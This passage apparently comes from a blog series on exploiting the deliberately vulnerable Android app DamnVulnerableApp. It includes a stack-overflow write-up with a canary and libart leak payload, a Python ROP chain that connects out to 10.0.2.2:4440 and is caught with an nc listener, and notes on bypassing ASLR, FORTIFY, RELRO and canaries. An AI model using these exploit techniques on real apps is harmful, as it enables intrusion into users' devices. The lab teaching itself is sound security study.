the end it worked! We abused the fact that there are no bounds checks for rsp, which allowed for redirecting the stack into attacker - controlled memory regions. This again triggered the execution of a ROP - chain.\nAn upgrade to the above attack would be to use a single ROP - chain that triggers execution of mmap and stores the result in a writable memory region. Then, using the Write - What - Where condition, we could fill the new memory region with arbitrary shellcode. Finally, we can overwrite the return address to redirect control flow into the shellcode.\n","permalink":"https://lolcads.github.io/posts/2024/07/eva_3/","tags":["Android","Binary Exploitation","JNI","E²VA","Use After Free","Memory Leak"],"title":"E²VA: Use After Free Write/Execute Module (Part 4)"},{"categories":null,"content":"Exploitation of EasyStackBufferOverflowModule This article describes exploitation of the EasyStackBufferOverflowModule. During exploitation, various Android - specific caveats are discussed.\nAssumptions We will assume that we have successfully grabbed a copy of the .apk file of damnvulnerableapp. Also, we will not discuss how to unpack an .apk file, but rather assume that we have access to libEasyStackBufferOverflowModule.so and the EasyStackBufferOverflowModule class. If it is unclear how to get access to these components when only given an .apk file, read the previous blog posts first!\nAnalysis baseline Lets first summarize what we have:\nAccess to libEasyStackBufferOverflowModule.so, which is a shared - object file that can be thrown into Ghidra . Access to .apk file, which can be thrown into jadx . First of all, consider the native function as a black box and just decompile the Java code via jadx. Then, the code for EasyStackBufferOverflowModule should look like this:\npackage com.damnvulnerableapp.vulnerable.modules; import com.damnvulnerableapp.common.exceptions.VulnerableModuleOperationException; import java.nio.ByteBuffer; /* loaded from: classes10.dex */ public final class EasyStackBufferOverflowModule extends VulnerableModule { private native byte[] vulnerableToUpper(byte[] bArr, int i); static { System.loadLibrary(\u0026#34;EasyStackBufferOverflowModule\u0026#34;); } public EasyStackBufferOverflowModule() { super(new StackBufferOverflowModuleConfiguration()); } @Override // com.damnvulnerableapp.vulnerable.modules.VulnerableModule public final void main() throws VulnerableModuleOperationException { byte[] message; output(\u0026#34;Welcome to the latest version of the echo service \u0026gt;:)\u0026#34;.getBytes()); do { message = input(); int unknown = ByteBuffer.wrap(input()).getInt(); byte[] upper = vulnerableToUpper(message, unknown); output(upper); } while (!new String(message).equals(\u0026#34;EXIT\u0026#34;)); output(\u0026#34;Exiting...\u0026#34;.getBytes()); } } The above code shows that the module takes two distinct inputs per iteration:\na message to be upper - cased an integer that is also part of upper - casing. Both inputs are forwarded to a native function called vulnerableToUpper. Finally, the upper - cased message will be sent back to us.\nFrom EasyStackBufferOverflowModule we can infer that there has to be a function in libEasyStackBufferOverflowModule.so, whose symbol name contains vulnerableToUpper. This can be confirmed via\n$ readelf --wide --symbols libEasyStackBufferOverflowModule.so | grep vulnerableToUpper 6: 00000000000008f0 322 FUNC GLOBAL DEFAULT 12 Java_com_damnvulnerableapp_vulnerable_modules_EasyStackBufferOverflowModule_vulnerableToUpper Okay, time for Ghidra! The following code has already been \u0026ldquo;beautified\u0026rdquo;:\njbyteArray Java_com_damnvulnerableapp_vulnerable_modules_EasyStackBufferOverflowModule_vulnerableToUpper (JNIEnv *env, jobject this, jbyteArray string, jint length) { char c; jbyte *raw; jsize stringLength; jbyteArray array; long fs; uint i; int bufferLength; char buffer [40]; long canary; canary = *(long *)(fs + 0x28); memset(buffer,0,0x20); raw = (*(*env)-\u0026gt;GetByteArrayElements)(env,string,(jboolean *)0x0); stringLength = (*(*env)-\u0026gt;GetArrayLength)(env,string); perfect_memcpy(buffer,raw,(int)stringLength); for (i = 0; i \u0026lt; 0x20; i = i + 1) buffer[i] = toupper((int)buffer[i]); if ((int)length \u0026lt; 0x101) bufferLength = perfect_strlen(buffer) + (int)length; else bufferLength = perfect_strlen(buffer); array = (*(*env)-\u0026gt;NewByteArray)(env,(jsize)bufferLength); (*(*env)-\u0026gt;SetByteArrayRegion)(env,array,0,(jsize)bufferLength,buffer); if (*(long *)(fs + 0x28) == canary) return array; /* WARNING: Subroutine does not return */ __stack_chk_fail(); } void perfect_memcpy(char *dst, char *src, uint size) { uint i; for (i = 0; i \u0026lt; size; i = i + 1) dst[i] = src[i]; return; } uint perfect_strlen(char *string) { uint i; for (i = 0; string[i] != \u0026#39;\\0\u0026#39;; i = i + 1) {} return i; } The Bug As the module name suggests, there is indeed a buffer overflow bug. One function that is often part of a buffer overflow is memcpy. Thus, taking a closer look into how memcpy is used can turn out useful.\nBuffer Overflow First of all, we can see that there is a classical buffer overflow:\n... memset(buffer,0,0x20); raw = (*(*env)-\u0026gt;GetByteArrayElements)(env,string,(jboolean *)0x0); stringLength = (*(*env)-\u0026gt;GetArrayLength)(env,string); perfect_memcpy(buffer,raw,(int)stringLength); ... This is due to the fact that stringLength is computed w.r.t. the length of the input buffer string, but not w.r.t. the length of the destination buffer buffer. Thus, if length \u0026gt; 0x20, a classical buffer overflow occurs. Notice that the user has complete control over the contents and length of string, which is actually of type jbyteArray.\nMemory Leak(s) In addition to the ability of manipulating the whole stack located above buffer, there is a weird sequence of code leading to returning more than \u0026ldquo;intended\u0026rdquo;. Namely:\n... if ((int)length \u0026lt; 0x101) bufferLength = perfect_strlen(buffer) + (int)length; else bufferLength = perfect_strlen(buffer); array = (*(*env)-\u0026gt;NewByteArray)(env,(jsize)bufferLength); (*(*env)-\u0026gt;SetByteArrayRegion)(env,array,0,(jsize)bufferLength,buffer); if (*(long *)(fs + 0x28) == canary) return array; So if length \u0026lt;= 0x100, then it will be added to bufferLength. Technically, setting length \u0026lt; 0 or length \u0026lt; -perfect_strlen(buffer) is possible, but does not seem very useful at first glance. Then, bufferLength bytes are copied from buffer into array. As strlen(buffer) + length \u0026gt; 0x20 = sizeof (buffer) is possible, this might leak arbitrary values from the stack coming after the buffer.\nSumming up, if we sent a payload of the form\nclient.forward(b\u0026#39;\\x42\u0026#39; * 0x20) client.forward(b\u0026#39;\\x00\\x00\\x01\\x00\u0026#39;) # big - endian leak = client.fetch() we would get an additional 0x100 bytes from the memory located above buffer, i.e. from the stack. This leaks, among other things\nReturn address to art_quick_generic_jni_trampoline, which leaks the base of libart.so (almost as awesome as libc.so\u0026hellip;as regards gadgets) Old rbp, i.e. a stack pointer Exploitation \u0026gt;:) Lets assume we already have a leaked libart.so pointer, i.e. we ran:\nclient.forward(b\u0026#39;\\x42\u0026#39; * 0x20) client.forward(b\u0026#39;\\x00\\x00\\x01\\x00\u0026#39;) leak = client.fetch() leak = decompose(leak[0x20:]) canary = leak[1] # libart.so address of art_quick_generic_jni_trampoline+220, # i.e. at file offset 0x39ffac (may differ) libart_base = p64(u64(leak[3]) - 0x39ffac) def decompose(leak : bytes): return [ leak[i * 8:(i+1) * 8] for i in range(len(leak) // 8) ] To figure out that the second qword is the canary, just iterate over the decomposed leak and look for not - address - looking values. I always encountered fully random canaries, i.e. 8 random bytes, which seem to be the default on Android . But this will only be relevant in case e.g. strcpy is used instead of e.g. memcpy.\nUsing your favourite tool for gadget extraction, like ropper or ROPgadget , you can construct a ROP - chain to get arbitrary code execution. Basically, your payload could look like this:\npayload = b\u0026#39;\\x42\u0026#39; * 0x20 payload += leak[0] # \u0026lt;-- unknown address payload += canary payload += leak[2] # \u0026lt;-- probably old rbp payload += gadget_1 payload += gadget_2 payload += enjoy ... because the leaked data from the stack looked like this (from low to high addresses):\nlower 0x72d1b9cdc210 \u0026lt;-- unknown address | 0x79291c4ee3e94be3 \u0026lt;-- that is the canary | 0x72d08b1c28b0 \u0026lt;-- probably old rbp higher 0x72d0f87a032c \u0026lt;-- this is your most favourite address to leak Notice that we do not need to care about the unknown address, because we are almost done.\nLets briefly think about how to approach the holy grail, i.e. arbitrary code execution. At first glance, a few options come to mind (consider the fact that e.g. libart.so is compiled with RELRO etc.):\nROP - chain that contains all the \u0026ldquo;code\u0026rdquo; (via gadgets) to execute. This (almost irreversibly) destroys the stack and you cannot expect that the app will recover from that. smaller ROP - chain that writes some qwords into global memory (e.g. .data@libart.so or .bss@libart.so) and then restores the stack. smaller ROP - chain that allocates writable and executable memory via e.g. mmap, writes the pointer returned in rax into global memory (thus only 8 bytes of global memory are invalidated). Then proceed as in 2. just with the new memory to write shellcode. Finally return into the shellcode. sigrop , but there is no reason to use this. For this blog post, we will only consider the first option, i.e. destroying the stack (don\u0026rsquo;t worry the other ones will be covered in later posts ;D).\nThe naming convention for gadgets is like this: gadget_opcode_operand1_operand2_opcode_operand1.... So you need to be able to identify opcodes on Intel (the emulator runs on x86_64) to understand the ROP - chain. The following is an example of a ROP - chain connecting to 10.0.2.2:4440, where 10.0.2.2 is an alias to your loopback interface :\n# Setup payload payload = b\u0026#39;a\u0026#39; * 0x20 payload += leak[0] # \u0026lt;-- unknown address payload += canary payload += leak[2] # \u0026lt;-- probably old rbp # Dynamically compute libc address via toupper@.got in libStackBufferOverflowModule.so # and store it into writable_memory payload = compute_libc_base(payload, writable_memory) payload = call_libc_function( payload, writable_memory, \u0026#39;socket\u0026#39;, [ p64(0x2), p64(0x1), p64(0x0) ] ) # Store socket in memory payload += gadget_pop_rdi payload += p64(u64(writable_memory) + 0x8) payload += gadget_mov_deref_rdi_rax # Construct sockaddr_in payload += gadget_pop_rdi payload += p64(u64(writable_memory) + 0x10) payload += gadget_pop_rax payload += b\u0026#39;\\x02\\x00\u0026#39; + b\u0026#39;\\x11\\x58\u0026#39; + b\u0026#39;\\x0a\\x00\\x02\\x02\u0026#39; payload += gadget_mov_deref_rdi_rax payload += gadget_pop_rdi payload += p64(u64(writable_memory) + 0x18) payload += gadget_pop_rax payload += b\u0026#39;\\x00\u0026#39; * 0x8 payload += gadget_mov_deref_rdi_rax # Connect to 10.0.2.2:4440 # rdx = size payload += gadget_pop_rdx payload += b\u0026#39;\\x10\u0026#39; + b\u0026#39;\\x00\u0026#39; * 0x7 # rsi = addr of socketaddr_in payload += gadget_pop_rsi payload += p64(u64(writable_memory) + 0x10) # rdi = sockfd payload += gadget_pop_rdi payload += p64(u64(writable_memory) + 0x8) payload += gadget_mov_rax_deref_rdi payload += gadget_mov_rdi_rax_pop_rax payload += writable_memory # Call function --\u0026gt; syscall instead of libc call, because this returns errno payload += gadget_pop_rax payload += p64(0x2a) payload += gadget_syscall Lets take a step back and see the individual steps the ROP - chain performs:\ncompute_libc_base computes the base address of libc.so by \u0026ldquo;leaking\u0026rdquo; a libc.so address from .got@libStackBufferOverflowModule.so into a register and writing that address into writable_memory call_libc_function calls socket@libc.so and puts the file descriptor into writable_memory+0x8 Then a structure of type struct sockaddr_in is crafted in global memory and describes where to connect to. Finally connect@syscall is called. At least on my end, calling connect@libc.so caused an error. This might be due to the fact that we wrote into global memory located in libart.so (\u0026hellip; whyever that would be the case though). For this PoC, we just need the app to perform a connection. Therefore we can use a system call to do so. We did not use a system call to create the socket, as there where no gadgets of the form syscall; ret (or ropper did not tell me). Thus, after the syscall gadget, the behaviour of the app is undefined. To catch the PoC, run the following command on your local machine:\nnc -lvnp 4440 Now one might argue: \u0026ldquo;Why don\u0026rsquo;t we just run a classical execve ROP - chain?\u0026rdquo;.\nThe answer to that lies in the implementation of DamnVulnerableApp. The manager app will clean up the vulnerable process, if the connection between them breaks. Observe that calling execve will definitely destroy the connection between the vulnerable app and the manager app. This forces the manager app to send a SIGKILL to the vulnerable app, thus ending its life even before the program to be executed via execve is initialized. As execve does not create a new process (and creating a new process might even violate the permissions of the vulnerable app), i.e. the PID stays the same, the manager app will always shutdown execve attempts. Also one could argue that it is better practice to keep the target app alive for stealth - reasons.\nConclusion In summary, the EasyStackBufferOverflowModule can be exploited by using a classical ROP - chain after leaking enough information. It is possible to get arbitrary code execution limited only by the constraints that DamnVulnerableApp (and its permissions and security mechanisms) imposes.\n","permalink":"https://lolcads.github.io/posts/2024/07/eva_2/","tags":["Android","Binary Exploitation","JNI","E²VA","Buffer Overflow","Memory Leak"],"title":"E²VA: Stack Buffer Overflow Module (Part 3)"},{"categories":null,"content":"Android Binary Exploitation In this post, we will examine security mechanisms that Android 12 employs in order to make binary exploitation a bit harder. Also, we will discuss how to get to certain information like shared - object files that are necessary for successful exploitation. The latter will be generalized to getting limited source code access to an app given a corresponding .apk file.\nEnvironment Before diving into details, the technical setup has to be clarified. All of the following observations on security mechanisms were encountered on a x86_64 Pixel 3 emulator running Android 12 (build number is SE1A.220203.002.A1 ). When referencing source code from Android Open Source Project (AOSP), it will be w.r.t. Android 12.0.0_r31 . The build variant for damnvulnerableapp is currently only debug. Also there is no GooglePlay enabled as we require root on the device for debugging purposes only.\nIn addition to that, standard compilation configurations of Android Studio are used to construct the app and compile native code. The version of Android Studio is as follows:\nAndroid Studio Dolphin | 2021.3.1 Build #AI-213.7172.25.2113.9014738, built on August 31, 2022 Runtime version: 11.0.13+0-b1751.21-8125866 amd64 VM: OpenJDK 64-Bit Server VM by JetBrains s.r.o. Linux 5.15.0-46-generic GC: G1 Young Generation, G1 Old Generation Memory: 2048M Cores: 12 Registry: external.system.auto.import.disabled=true debugger.watches.in.variables=false ide.text.editor.with.preview.show.floating.toolbar=false Current Desktop: ubuntu:GNOME If your environment differs even in the slightest way, you might need different offsets, addresses etc. to get your exploits to work. Thus, if I presents exploit sketches, do not assume that they work out of the box!\nOverview of Security Mechanisms on Android Next, via a non - exhaustive list of security mechanisms we will dive into the details of how Android makes life of an attacker (a bit) harder. If possible, we will try to figure out a way to bypass each security mechanism through additional assumptions.\nPermissions As usual, an app has certain permissions to access specific data or perform specific actions. E.g. in order to create a connection to a remote host via java.net.Socket , an app has to declare the install - time permission android.permission.INTERNET in its manifest. If a permission is not declared (install - time) or not granted (runtime), then the app will not be able to provide the functionality that needs the respective permission(s).\nContinuing the example above, if we somehow manage to get abitrary code execution inside of an Android app, but the app does not declare android.permission.INTERNET, then we will not be able to create a socket connection to call back to our netcat - listener for a reverse shell.\nPermissions can further be divided into\nInstall - time permissions : System automatically grants these upon installation. These permissions can be further classified into Normal permissions : Allow for access to data and actions beyond the app\u0026rsquo;s sandbox. Signature permissions : Irrelevant for now! Runtime permissions : User will be shown a permission prompt that specifically asks for a potentially dangerous permission. These prompts will be presented only if the app is running/starting. Special permissions : Irrelevant for now! We assume an app that is not even capable of specifying these permissions. Assuming source code access and thus access to AndroidManifest.xml, we can deduce which actions are allowed in our shellcode. Another (naive) assumption is to believe that an app is incapable of adding additional permissions without a user\u0026rsquo;s consent via publicly known means (otherwise this would be a severe security issue). Of couse, our shellcode could try to present the user permission prompts that give us further tools to play with, but this is far from stealthy!\nSummarizing, a shellcode is limited to the app\u0026rsquo;s permissions. Theoretically it is possible for shellcode to request runtime permissions \u0026hellip; at runtime. It would be interesting to see whether it is possible to request install - time permissions at runtime.\nFORTIFY This mechanism adds additional compile - time and/or runtime checks to the C standard library. These are mainly memory - related checks, e.g.\nstruct Foo { int val; struct Foo *next; }; void initFoo(struct Foo *f) { memset(\u0026amp;f, 0, sizeof(struct Foo)); } will not work, because FORTIFY is able to detect the 8 - byte overflow at compile - time (example taken from here ).\nAt compile - time, FORTIFY will block compilation, if it is able to detect a bad call to a standard library function like e.g. memset. If FORTIFY is missing information or is very certain that a call is safe, then FORTIFY will be not be part of the process image. Finally, if there is a call, but FORTIFY is not sure whether the call is safe or not, it will redirect the call to a special FORTIFY\u0026rsquo;ed version of the called function, which applies additional checks to ensure correct usage of the function.\nLets consider an Android - related example of the function memset :\n__BIONIC_FORTIFY_INLINE void* memset(void* const s __pass_object_size0, int c, size_t n) __overloadable /* If you\u0026#39;re a user who wants this warning to go away: use `(\u0026amp;memset)(foo, bar, baz)`. */ __clang_warning_if(c \u0026amp;\u0026amp; !n, \u0026#34;\u0026#39;memset\u0026#39; will set 0 bytes; maybe the arguments got flipped?\u0026#34;) { #if __ANDROID_API__ \u0026gt;= 17 \u0026amp;\u0026amp; __BIONIC_FORTIFY_RUNTIME_CHECKS_ENABLED return __builtin___memset_chk(s, c, n, __bos0(s)); #else return __builtin_memset(s, c, n); #endif } As these are builtins, they are implemented by the compiler and thus pretty hard to track down (if you are interested, consider code that looks like a compile - time check and a runtime - check ; no guarantees that these references are what is actually being called!).\nSooo\u0026hellip;how to break it? Apparently, if FORTIFY is lacking information, it will just give up. The developers gave a pretty nice example for FORTIFY\u0026rsquo;s limitations:\n__attribute__((noinline)) // Tell the compiler to never inline this function. inline void intToStr(int i, char *asStr) { sprintf(asStr, \u0026#34;%d\u0026#34;, i); } char *intToDupedStr(int i) { const int MAX_INT_STR_SIZE = sizeof(\u0026#34;2147483648\u0026#34;); // MAX_INT_STR_SIZE = 11 = 10 + 1 char buf[MAX_INT_STR_SIZE]; intToStr(i, buf); return strdup(buf); } Setting i = -2147483648 (which is 0x80000000, because of 2\u0026rsquo;s - complement for 4 - byte values) would result in an off - by - one bug, because buf is a buffer of 11 elements, the last of which is supposed to be a null - terminator. Because sprintf will also put a - sign into buf, the null - terminator will be moved back by one and therefore overwrite the least - significant byte of the next qword on the stack. If rbp was modified, then this would most likely crash the entire program. FORTIFY does not catch this bug, because from the perspective of intToStr, FORTIFY cannot \u0026ldquo;see\u0026rdquo; the allocation of buf. Neither can FORTIFY determine for sure the size of a char*, which could be of arbitrary length, nor can it determine where buf is pointing to (stack, heap, .bss, .data, \u0026hellip;).\nObserve that FORTIFY makes it significantly harder for developers to write vulnerable code. Still, if developers decide to implement their own versions of e.g. memcpy this fully bypasses FORTIFY. Also, as can be seen in the above example, there are settings, in which FORTIFY cannot help, i.e. e.g. if the allocation of a buffer takes place in a different function and this buffer is passed as a type*.\nOn defeating PIEs When building native apps on Android via Android Studio, we will almost always use cmake\u0026rsquo;s add_library with the SHARED flag. This will encapsulate the native code into a lib\u0026lt;somename\u0026gt;.so file, which is actually a shared - object file (ELF ). According to documentation , for such SHARED libraries the property POSITION_INDEPENDENT_CODE is automatically set to ON, thus resulting in Position - Independent - Executables (PIEs; To be precise with terminology, the shared - object file contains Position - Independent - Code (PIC). From ELF\u0026rsquo;s perspective, not every shared - object file is an executable and vice versa).\nWhen calling System.loadLibrary(\u0026quot;xyz\u0026quot;), we can trace down the call hierarchy to versions of dlopen , which is implemented in the linker . Finally, ReserveWithAlignmentPadding will be called, which returns a randomized base address . This confirms that when loading native shared - object files, they will have ASLR enabled by default.\nDefeating ASLR is thus key to handling binary exploitation in PIEs. This can be archieved in numerous ways. The following is a non - exhaustive list of possible ways to break ASLR:\nLeaking an address from e.g. a code region. It seems that the random shift used for the stack (and heap etc.) and a loaded shared - object file differ. This follows from the randomized base address , which is different on each execution of ReserveWithAlignmentPadding. Abusing a side channel that allows for brute - forcing / leaking bytes of an address one by one instead of being forced into brute - forcing / leaking the entire address at once. From ReserveWithAlignmentPadding , by probing for accessible memory mappings. Depending on the app, we might be able to even distinguish different kinds of errors / signals when accessing / returning to invalid memory. However, for memory probing to work the process should not crash upon signals like SIGSEG or SIGILL, which is very rare. Full RELRO With the above security mechanisms in place, it would still be \u0026ldquo;easy\u0026rdquo; to abuse a leak combined with a Write - What - Where condition, as e.g. .got is still writable. E.g. overwriting a .got entry of strlen that is given a string of our choice could result in a redirection to system (for a more detailed discussion, see this blog post ). This is, among other things, prevented by full / partial Relocations Read - Only, i.e. full / partial RELRO, which can be enabled on Android. Full RELRO marks certain memory regions, like e.g. .got, as read - only after program startup. It seems that it is enabled by default, when creating a new native android app in Android Studio.\nNow the question arises, how this mitigation can be circumvented. This again depends on the app. Lets consider the non - exhaustive list:\nGiven a Write - What - Where condition and knowledge on all addresses: Try to find and overwrite a global variable (located in .bss or .data) that impacts the control flow, e.g. a function pointer. Overwrite the return address on the stack to return to a ROP - chain located \u0026ldquo;somewhere else\u0026rdquo;. Given access to mprotect: Call mprotect on .got to make it writable again. Non - executable Stack (and Heap) As has been the case for decades, the stack and heap is marked as non - executable by default. Thus, calling your classical NOP - sledge for help won\u0026rsquo;t do any good.\n(Un-)fortunately, the stack and heap can be used to store gadgets for a ROP - chain.\nCanaries and cookies Depending on how a native function is implemented and compiled, it can be given a stack canary. This canary aims to protect the stack frame, i.e. the return address and stored rbp, from potential buffer overflows on the stack. In our case, this canary is an 8 - byte random value that is very hard to predict. Doing the math reveals that we have a 1/(2^64) chance to hit the correct canary. This is why we often assume that there is some kind of leak that (partially) reveals the canary (bytes). Naturally, two approaches come to mind when thinking of \u0026ldquo;leaking an 8 byte random value\u0026rdquo;:\nReading it directly from the stack. Trivially, this will reveal the value.\nBrute - forcing it via a side channel. The side channel could be e.g. an oracle that either says\n\u0026ldquo;Canary is correct\u0026rdquo;, i.e. process keeps running \u0026ldquo;Canary is incorrect\u0026rdquo;, i.e. process crashes. If we overwrite just the least - significant byte of the canary, this byte will be in either of the above categories. If the process does not crash, we can continue with the next canary byte until all 8 bytes are leaked.\nSo, why would the latter approach work? The canary will be consisting of 8 random bytes for each process start, right? Right? No! Not going into the details , the underlying syscall fork, which is used to spawn damnvulnerableapp and its subprocess that is running the vulnerable module, will be called from the same parent process (zygote) over and over again, i.e. for each app. Therefore, apps contain large duplicated memory regions, canary included.\nGetting the source And now for something completely different. Well, technically speaking it is not that different, because packing the source code could be considered a form of obfuscation, which again could be considered a security precaution. Now we will take the perspective of an attacker that tries to get access to the source code of an app while only having access to an app\u0026rsquo;s apk file.\nFinding the apk file There are numerous ways to get an apk file of an app, among which the following seem to be the easiest ones:\nUse Android Studio to build the app and search for the apk file in the directory tree of the app. This implies source code access and therefore makes analyzing an apk file obsolete, but it is a way. Assuming root access on an Android device / emulator, user - installed apps can be found at e.g. /data/app/. There can be a corresponding .apk file to grab for further static analysis (this might depend on the Android version). Unpacking apk files Assuming we grabbed ourselves an apk file, we can start analyzing it:\n$ file base.apk base.apk: Zip archive data, at least v?[0] to extract $ unzip base.apk -d ./base ... $ ls base AndroidManifest.xml classes10.dex classes11.dex classes2.dex classes3.dex classes4.dex classes5.dex classes6.dex classes7.dex classes8.dex classes9.dex classes.dex lib META-INF res resources.arsc Going from here we can easily access the native libraries that are part of the app:\n$ ls base/lib/x86_64 libDoubleFreeModule.so libEasyStackBufferOverflowModule.so libHeapOverflowModule.so libOffByOneModule.so libStackBufferOverflowModule.so libUseAfterFreeExecModule.so libUseAfterFreeWriteModule.so These shared - object files can later be used for finding gadgets and so on. Further they can be analyzed / decompiled via e.g. Ghidra . The decompiled code of logMessage#libOffByOneModule.so could look like this:\nundefined8 Java_com_damnvulnerableapp_vulnerable_modules_OffByOneModule_logMessage (long *param_1,undefined8 param_2,undefined8 param_3) { int iVar1; undefined4 uVar2; undefined8 uVar3; void *pvVar4; undefined8 uVar5; long in_FS_OFFSET; int local_cc; undefined8 local_a0; timespec local_28; undefined local_11; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); uVar3 = (**(code **)(*param_1 + 0x5c0))(param_1,param_3,\u0026amp;local_11); DAT_00103028 = DAT_00103028 + 1; DAT_00103020 = realloc(DAT_00103020,DAT_00103028 * 0x108); if (DAT_00103020 == (void *)0x0) { local_a0 = 0; } else { pvVar4 = (void *)((long)DAT_00103020 + (DAT_00103028 + -1) * 0x108); __memset_chk(pvVar4,0,0x108,0xffffffffffffffff); __memcpy_chk((long)pvVar4 + 0x100,\u0026amp;PTR_FUN_00103010,8,0xffffffffffffffff); local_cc = (**(code **)(*param_1 + 0x558))(param_1,param_3); if (0x100 \u0026lt; local_cc + -1) { local_cc = 0xff; } __memcpy_chk(pvVar4,uVar3,(long)local_cc,0xffffffffffffffff); iVar1 = clock_gettime(0,\u0026amp;local_28); if (iVar1 != -1) { local_28.tv_nsec = local_28.tv_nsec + 10; } uVar5 = (**(code **)((long)pvVar4 + 0x100))(pvVar4,(long)local_cc); uVar2 = __strlen_chk(uVar5,0xffffffffffffffff); local_a0 = (**(code **)(*param_1 + 0x580))(param_1,uVar2); (**(code **)(*param_1 + 0x680))(param_1,local_a0,0,uVar2,uVar5); (**(code **)(*param_1 + 0x600))(param_1,param_3,uVar3,2); } if (*(long *)(in_FS_OFFSET + 0x28) == local_10) { return local_a0; } /* WARNING: Subroutine does not return */ __stack_chk_fail(); } In order to not being forced into manually setting up the jni type definitions, see either jni_all.h or jni_all.h . When in the CodeBrowser, try running File -\u0026gt; Parse C Source\u0026hellip;, add the corresponding file to \u0026ldquo;Source files to parse\u0026rdquo;, choose the correct base profile (\u0026ldquo;parse configuration\u0026rdquo;) and set the parse options to e.g. this .\nTo be more precise, first download any of the above mentioned jni_all.h files. Then open File -\u0026gt; Parse C Source\u0026hellip;. You should be prompted with the following window: Next, choose an existing profile as a base profile. E.g. choose generic_clib_32.prf and click on the Save profile to new name button (upper right corner). Then choose a name that you recognize: After giving the new profile a nice name, we need to adjust the parse options. E.g. you can copy them over from here . Do not overwrite -I options: Finally, add jni_all.h to the Source files to parse panel by clicking on the green plus sign to the right. This should open files. Navigate to jni_all.h and open it. You should see a new entry if you scrolled all the way down. Now click the Save profile button at the top and then Parse to program at the bottom. If you now retype a variable, e.g. the first argument of a JNI function to JNIEnv*, you will see actual function names like NewByteArray etc.\nNow we are just missing the Java code that calls this native function\u0026hellip;\nGetting Java code In order to obtain the Java code of an app, an attacker could utilize a tool like jadx . This basically reconstructs the project structure we see in Android Studio:\n$ jadx-gui ./base.apk ... This decompiles a large portion of the app. Continuing the example of the OffByOneModule, we can get the following decompiled code for the OffByOneModule class:\npackage com.damnvulnerableapp.vulnerable.modules; import com.damnvulnerableapp.common.exceptions.VulnerableModuleException; /* loaded from: classes10.dex */ public class OffByOneModule extends VulnerableModule { private static native byte[] logMessage(byte[] bArr); static { System.loadLibrary(\u0026#34;OffByOneModule\u0026#34;); } public OffByOneModule() { super(new OffByOneModuleConfiguration()); } @Override // com.damnvulnerableapp.vulnerable.modules.VulnerableModule public void main() throws VulnerableModuleException { output(\u0026#34;Welcome to the most secure message logger in the world!\u0026#34;.getBytes()); while (true) { output(\u0026#34;Enter a message to log: \u0026#34;.getBytes()); byte[] message = input(); if (message == null) { output(\u0026#34;Failed to receive the message to log...Better safe than sorry!\u0026#34;.getBytes()); } else if (new String(message).equals(\u0026#34;EXIT\u0026#34;)) { output(\u0026#34;Your logged message(s) were stored successfully.\u0026#34;.getBytes()); return; } else { output(logMessage(message)); } } } } Grabbing System Libraries Often there are libraries, of which we have a leaked pointer. Having such a pointer is nice and all, but it will not help, if we do not have access to the corresponding shared - object file. Lets try to get access to libart.so, the android runtime that runs the Java code we wrote for the app. Among other things, it handles native calls via trampoline functions like art_quick_generic_jni_trampoline .\nIn order to find libart.so, again assuming root access, running the damnvulnerableapp reveals the binary that underlies the process:\n# ps -e | grep damn u0_a107 4122 357 13798620 114268 do_epoll_wait 0 S com.damnvulnerableapp # file /proc/4122/exe /proc/4122/exe: symbolic link to /system/bin/app_process64 # readelf -d /system/bin/app_process64 ... 0x0000000000000001 (NEEDED) Shared library: [libandroid_runtime.so] 0x0000000000000001 (NEEDED) Shared library: [libbinder.so] 0x0000000000000001 (NEEDED) Shared library: [libcutils.so] 0x0000000000000001 (NEEDED) Shared library: [libhidlbase.so] 0x0000000000000001 (NEEDED) Shared library: [liblog.so] 0x0000000000000001 (NEEDED) Shared library: [libnativeloader.so] 0x0000000000000001 (NEEDED) Shared library: [libsigchain.so] 0x0000000000000001 (NEEDED) Shared library: [libutils.so] 0x0000000000000001 (NEEDED) Shared library: [libwilhelm.so] 0x0000000000000001 (NEEDED) Shared library: [libc++.so] 0x0000000000000001 (NEEDED) Shared library: [libc.so] 0x0000000000000001 (NEEDED) Shared library: [libm.so] 0x0000000000000001 (NEEDED) Shared library: [libdl.so] ... This means that libart.so will be loaded later on, i.e. not at startup. Further analysis reveals:\n# cat /proc/4122/maps | grep libart.so 730c03400000-730c0357b000 r--p 00000000 fe:0f 57 /apex/com.android.art/lib64/libart.so 730c0377a000-730c03e0b000 r-xp 0017a000 fe:0f 57 /apex/com.android.art/lib64/libart.so 730c0400a000-730c0401d000 r--p 0080a000 fe:0f 57 /apex/com.android.art/lib64/libart.so 730c0421c000-730c04220000 rw-p 0081c000 fe:0f 57 /apex/com.android.art/lib64/libart.so # exit $ adb pull /apex/com.android.art/lib64/libart.so ./libart.so After the above commands, libart.so should be in our current working directory, ready to be analyzed via Ghidra, objdump (which will most likely not work, because objdump does not recognize the architecture) or readelf .\nThere may be two unexpected aspects:\nEven if you do not have root access on the emulator, it is possible to run adb pull \u0026lt;from remote\u0026gt; \u0026lt;to local\u0026gt;. We only used root to access /proc/4122/maps etc. The name of the binary that underlies damnvulnerableapp is /system/bin/app_process64. To that end, observe that Java apps are forked from the zygote process . The zygote process, among other things, initializes the JVM to allow for faster app starts. Analysing the Stack Trace There is one more thing to consider. When given a leak, e.g. an address from the stack, then it is important to (partially) understand what values are located on the stack. To that end, one may write a small native app via Android Studio, set a breakpoint on the native function and run the app. This could result in the following stack trace:\nJava_com_damnvulnerableapp_vulnerable_modules_EasyStackBufferOverflowModule_vulnerableToUpper EasyStackBufferOverflowModule.c:32 art_quick_generic_jni_trampoline 0x000071636dba032c art_quick_invoke_stub 0x000071636db95015 art::ArtMethod::Invoke(art::Thread *, unsigned int *, unsigned int, art::JValue *, const char *) 0x000071636dc1d9fb art::interpreter::ArtInterpreterToCompiledCodeBridge(art::Thread *, art::ArtMethod *, art::ShadowFrame *, unsigned short, art::JValue *) 0x000071636dda335d art::interpreter::DoCall\u0026lt;…\u0026gt;(art::ArtMethod *, art::Thread *, art::ShadowFrame \u0026amp;, const art::Instruction *, unsigned short, art::JValue *) 0x000071636dd9d16d art::interpreter::ExecuteSwitchImplCpp\u0026lt;…\u0026gt;(art::interpreter::SwitchImplContext *) 0x000071636dbac1d0 ExecuteSwitchImplAsm 0x000071636dba23d6 art::interpreter::ExecuteSwitch(art::Thread *, const art::CodeItemDataAccessor \u0026amp;, art::ShadowFrame \u0026amp;, art::JValue, bool) 0x000071636dd9ca6e art::interpreter::Execute(art::Thread *, const art::CodeItemDataAccessor \u0026amp;, art::ShadowFrame \u0026amp;, art::JValue, bool, bool) 0x000071636dd94ae1 